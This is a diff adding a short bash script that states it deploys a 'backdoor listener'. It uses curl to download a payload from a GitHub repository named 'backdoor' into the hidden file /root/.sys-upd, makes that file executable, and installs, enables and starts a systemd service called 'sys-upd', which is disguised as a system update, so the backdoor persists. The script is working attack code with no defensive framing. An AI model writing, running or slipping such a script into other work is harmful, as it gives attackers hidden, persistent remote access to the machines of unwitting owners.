@@ -1,0 +1,26 @@
+#!/bin/bash
+
+# GitHub URL
+BASE_URL="https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/Bash"
+
+echo "- Starting deployment of backdoor listener..."
+
+echo "- Downloading sys-upd to /root/.sys-upd"
+curl -s "$BASE_URL/sys-upd" -o /root/.sys-upd
+chmod +x /root/.sys-upd
+echo "- Script placed at /root/.sys-upd and made executable"
+
+echo "- Downloading systemd service file to /etc/systemd/system/"
+curl -s "$BASE_URL/sys-upd.service" -o /etc/systemd/system/sys-upd.service
+echo "- Service file saved at /etc/systemd/system/sys-upd.service"
+
+echo "- Reloading systemd daemon..."
+systemctl daemon-reload
+
+echo "- Enabling the sys-upd service..."
+systemctl enable sys-upd
+
+echo "- Starting the sys-upd service..."
+systemctl start sys-upd
+
+echo "- Backdoor listener deployed and running as a systemd service!"
